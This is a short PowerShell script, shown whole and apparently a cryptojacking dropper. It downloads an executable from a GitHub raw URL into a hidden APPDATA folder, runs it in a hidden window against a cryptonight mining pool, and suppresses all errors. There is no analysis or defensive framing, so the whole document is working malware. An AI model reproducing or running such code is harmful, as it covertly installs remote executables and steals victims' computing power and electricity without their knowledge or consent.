if($env:PROCESSOR_ARCHITECTURE -eq "x86"){$jd = 'https://raw.githubusercontent.com/jommb/872/master/m'}Else{$jd = 'https://raw.githubusercontent.com/jommb/872/master/b'} New-Item -ItemType Directory -Force ($env:APPDATA+'\kina\'); &{ Try { (new-object System.Net.WebClient).DownloadFile($jd, ($env:APPDATA+'\kina\grdt.exe')); Start-Process -WindowStyle hidden $env:APPDATA'\kina\grdt.exe' '--auto --any --forever --variation 3 --variation 15 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x'} Catch {} };